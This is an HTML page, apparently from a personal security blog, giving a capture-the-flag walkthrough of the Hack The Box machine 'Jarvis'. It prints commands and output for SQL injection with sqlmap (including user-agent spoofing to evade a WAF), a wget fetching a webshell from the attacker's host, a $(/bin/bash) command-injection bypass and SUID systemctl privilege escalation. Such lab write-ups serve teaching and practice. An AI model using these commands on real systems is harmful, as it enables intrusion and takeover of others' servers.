@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <!-- JavaScript Sources -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/modaltoc.js"></script>
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" type="text/css" href="/css/navigation.css">
+    <link rel="stylesheet" type="text/css" href="/css/main.css">
+    <link rel="stylesheet" href="/css/tocbot.css">
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+</head>
+<body>    
+    <div class="left-navigation">
+        <div class="nav-buttons">
+           <button onclick="window.location.href = '/about.html';">About</button>
+           <button class="accordion">Write-ups</button>
+           <div class="panel">
+             <ul>
+               <li><button class="machines" href="#">Machines</button></li>
+               <li><button onclick="window.location.href = '/pwn.html';">Pwn</button></li>
+             </ul>
+           </div>
+           <button onclick="window.location.href = ' /resources.html';">Resources</button>
+	   <button onclick="window.location.href = '/index.html';">Home</button>
+        </div>
+	<div class="contact">
+	    <div class="contact">
+ 		<p>Contact:<br>
+		   Adrian Curtean<br>
+	   	   555-555-5555<br>
+		   <a href="mailto:acurtean@asu.edu?Subject=Hey">acurtean@asu.edu</a>
+  	        </p>
+	    </div>
+	</div>
+    </div>
+    <div id="fadewrapper">
+	<div class="page-content">
+	    <div class="heading">
+		<div class="heading-text" id="0">HtB - Jarvis</div>
+	 	<img src="/images/jarvis/jarvis.png" alt="machine logo">
+            </div>
+	    <div class="subheading">
+		<h3 id="1">Initial Recon</h3>
+	    </div>
+	    <p class="writeup-text">As always, we begin the initial recon phase with an nmap scan.</p>
+	    <code class="codebox">root@kali:~# nmap -sC -sV 10.10.10.143
+		Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-08 17:33 EET
+		Nmap scan report for 10.10.10.143
+		Host is up (0.24s latency).
+		Not shown: 998 filtered ports
+		PORT   STATE SERVICE VERSION
+		22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+		| ssh-hostkey:
+		|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
+		|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
+		|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
+		80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+		| http-cookie-flags:
+		|   /:
+		|     PHPSESSID:
+		|_      httponly flag not set
+		|_http-server-header: Apache/2.4.25 (Debian)
+		|_http-title: Stark Hotel
+		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+		
+		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+		Nmap done: 1 IP address (1 host up) scanned in 32.86 seconds
+	    </code>
+	    <p class="writeup-text">We see from the output that there is a webserver running on port 80 as well as SSH access 
+		available on port 22.</p>
+	    <div class="subheading">
+	        <h3 id="2">Port 80 Enumeration</h3>
+	    </div>
+	    <p class="writeup-text">Browsing to the IP address in our web browser brings us to what looks like a hotel website.</p>	 
+	    <img class="writeup-img" src="/images/jarvis/1.png" alt="index page">
+	    <p class="writeup-text">After looking around the website, we see a possible injection point in the cod parameter 
+		we discover after clicking on a hotel room.</p>
+	    <img class="writeup-img" src="/images/jarvis/2.png" alt="injection point">
+	    <p class="writeup-text">We can perform a quick SQL injection test by appending a single quote(') to the number 5 and 
+		check the webpage for anything strange. As we can see below, the page is now mostly blank. This indicates that a SQL 
+		injection vulnerability exists.</p>
+	    <img class="writeup-img" src="/images/jarvis/3.png" alt="sqli test">
+	    <p class="writeup-text">Let's run <a href="http://sqlmap.org/">sqlmap</a> against the cod parameter with a specified 
+		user-agent. We specify a Firefox user-agent because the website has a 
+		<a href="https://owasp.org/www-community/Web_Application_Firewall">WAF</a> that recognizes the default sqlmap user-agent.</p>
+		<div class="subheading">
+			<h3 id="3">SQL Injection + Reverse Shell</h3>
+		</div>
+		<code class="codebox">root@kali:~# sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --os-shell
+		.
+		.
+		.
+		[19:31:23] [INFO] the back-end DBMS is MySQL
+		web server operating system: Linux Debian 9.0 (stretch)
+		web application technology: PHP, Apache 2.4.25
+		back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+		[19:31:23] [INFO] going to use a web backdoor for command prompt
+		[19:31:23] [INFO] fingerprinting the back-end DBMS operating system
+		[19:31:24] [INFO] the back-end DBMS operating system is Linux
+		which web application language does the web server support?
+		[1] ASP
+		[2] ASPX
+		[3] JSP
+		[4] PHP (default)
+		> 4
+		[19:31:29] [WARNING] unable to automatically retrieve the web server document root
+		what do you want to use for writable directory?
+		[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
+		[2] custom location(s)
+		[3] custom directory list file
+		[4] brute force search
+		> 2
+		please provide a comma separate list of absolute directory paths: /var/www/html
+		[19:31:48] [INFO] retrieved web server absolute paths: '/images/'
+		[19:31:48] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
+		[19:31:48] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpumauo.php
+		[19:31:48] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpbhfuz.php
+		[19:31:48] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
+		os-shell> whoami
+		do you want to retrieve the command standard output? [Y/n/a] Y
+		command standard output: 'www-data'
+		
+		os-shell> wget http://10.10.14.25:8000/webshell.php -O /var/www/html/brokkrweb.php
+		do you want to retrieve the command standard output? [Y/n/a] a
+		command standard output:
+		---
+		--2020-04-09 19:37:57--  http://10.10.14.25:8000/webshell.php
+		Connecting to 10.10.14.25:8000... connected.
+		HTTP request sent, awaiting response... 200 OK
+		Length: 7205 (7.0K) [application/octet-stream]
+		Saving to: '/var/www/html/brokkrweb.php'
+		
+			 0K .......                                               100% 1.87M=0.004s
+		
+		2020-04-09 19:37:57 (1.87 MB/s) - '/var/www/html/brokkrweb.php' saved [7205/7205]
+		
+		---
+		os-shell> 
+	    </code>
+	    <p class="writeup-text">What we did above is append the <code>--os-shell</code> flag to our initial sqlmap command after 
+		verifying the SQLi vulnerability. At the first prompt we select 4 for PHP because we know the website supports PHP. The 
+		next prompt we can enter the standard linux web directory of <code>/var/www/html/</code>. From here we can run standard 
+		linux commands to verify that the shell is working. Now we'll want to upload a webshell via our SQLi vulnerability and 
+		then trigger a true reverse shell.</p>
+		<img class="writeup-img" src="/images/jarvis/4.png" alt="webshell=reverseshell">
+		<div class="subheading">
+			<h3 id="4">Command Injection + user.txt</h3>
+	    </div>
+		<p class="writeup-text">After some general enumeration we check to see if the www-data user can run any commands via sudo with <code>sudo -l</code></p>
+	    <img class="writeup-img" src="/images/jarvis/5.png" alt="webshell=reverseshell">
+		<p class="writeup-text">The above output informs us that we can run the simpler.py script as the user pepper without having 
+		to enter a password. This likely indicates that simpler.py is the privilege escalation vector. Let's checkout the source code:</p>
+		<code class="codebox">#!/usr/bin/env python3
+		from datetime import datetime             
+		import sys               
+		import os 
+		from os import listdir               
+		import re        
+		def show_help():         
+			message='''
+		********************************************************
+		* Simpler   -   A simple simplifier ;)                 *
+		* Version 1.0                                          *
+		********************************************************
+		Usage:  python3 simpler.py [options]
+		Options:
+			-h/--help   : This help
+			-s          : Statistics
+			-l          : List the attackers IP
+			-p          : ping an attacker IP                
+			'''     
+			print(message)
+		
+		def show_header():
+			print('''***********************************************
+			 _                 _                       
+		 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+		/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+		\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+		|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+						|_|               |_|    |___/ 
+										@ironhackers.es
+		***********************************************                   
+		''')
+		.
+		.
+		.
+		.
+		def exec_ping():
+			forbidden = ['&', ';', '-', '`', '||', '|']
+			command = input('Enter an IP: ')
+			for i in forbidden:
+				if i in command:
+					print('Got you')
+					exit()
+			os.system('ping ' + command)
+		</code>
+		<p class="writeup-text">The only interesting function in the script is the exec_ping() function. It checks for characters to ensure 
+		that command injection is not possible. Unfortunately, it does not check for the $ symbol. In bash, this allows us to execute a command
+		inside of another command. In this case we'll abuse it to spawn a bash shell as the pepper user.</p>
+		<code class="codebox">
+		$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p    
+		***********************************************
+			 _                 _                       
+		 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+		/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+		\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+		|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+						|_|               |_|    |___/ 
+										@ironhackers.es
+										
+		***********************************************
+		Enter an IP: $(/bin/bash)
+		pepper@jarvis:/var/www/Admin-Utilities$ whoami
+		pepper@jarvis:/var/www/Admin-Utilities$
+		</code>
+		<p class="writeup-text">After attempting a few commands, we can see we get no output via this shell. If we run the same command command we 
+		used for our initial reverse shell, we can catch a new shell as the pepper user and finally grab the user flag.</p>
+		<img class="writeup-img" src="/images/jarvis/6.png" alt="user.txt">
+	    <div class="subheading">
+			<h3 id="4">Privilege Escalation + root.txt</h3>
+	    </div>
+	    <p class="writeup-text">Let's take a look at the available binaries with the sticky bit set.</p>
+		<code class="codebox">pepper@jarvis:~$ find / -perm -4000 2>/dev/null
+		/bin/fusermount
+		/bin/mount
+		/bin/ping
+		/bin/systemctl
+		/bin/umount
+		/bin/su
+		/usr/bin/newgrp
+		/usr/bin/passwd
+		/usr/bin/gpasswd
+		/usr/bin/chsh
+		/usr/bin/sudo
+		/usr/bin/chfn
+		/usr/lib/eject/dmcrypt-get-device
+		/usr/lib/openssh/ssh-keysign
+		/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+		pepper@jarvis:~$
+		</code>
+		<p class="writeup-text">We see systemctl is a SUID binary. This binary allows the user to manage services running on the host. Let's see 
+		if there is an entry at <a href="https://gtfobins.github.io/">GTFObins.</a></p>
+	    <img class="writeup-img" src="/images/jarvis/7.png" alt="gtfobins">
+	    <p class="writeup-text">Our first step is to create our malicious service which will be ran as root when called by systemctl.</p>
+	    <img class="writeup-img" src="/images/jarvis/8.png" alt="nasty service">
+	    <p class="writeup-text">With our service created, we must enable it and then start it to catch our shell as the root user.</p>
+  	    <img class="writeup-img" src="/images/jarvis/9.png" alt="echo exploit code">
+	    <p class="writeup-text">At this point, the machine is fully compromised and we can now view the root flag.</p>
+	    <img class="writeup-img" src="/images/jarvis/root.png" alt="root exploit and root.txt">
+        </div>
+	<!-- The Modal -->
+	<div id="myModal" class="modal">
+
+        <!-- The Close Button -->
+        <span class="close" onclick="document.getElementById('myModal').style.display='none'">&times;</span>
+
+        <!-- Modal Content (The Image) -->
+        <img class="modal-content" id="img01">
+
+        <!-- Modal Caption (Image Text) -->
+        <div id="caption"></div>
+        </div>
+    </div>
+	<div class="right-navigation">
+   	   <div class="js-toc"></div>
+	</div>
+</body>
+</html>
